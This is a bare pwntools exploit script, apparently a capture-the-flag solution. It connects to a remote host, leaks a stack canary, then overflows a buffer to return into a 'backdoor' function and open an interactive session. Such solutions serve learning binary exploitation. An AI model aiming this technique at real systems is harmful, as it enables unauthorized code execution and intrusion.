#coding=utf-8
from pwn import *

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

# context.log_level = 'DEBUG'

# p = process(binary)
p = remote('119.91.229.75',51363)

# p = gdb.debug("./1.out","b main")


backdoor = 0x401262
sla(':', '14')
canary = int(ru('00',drop=False), 16)

payload = b'a' * 104 + p64(canary) + p64(0) + p64(backdoor)
sla('?', payload)

p.interactive()
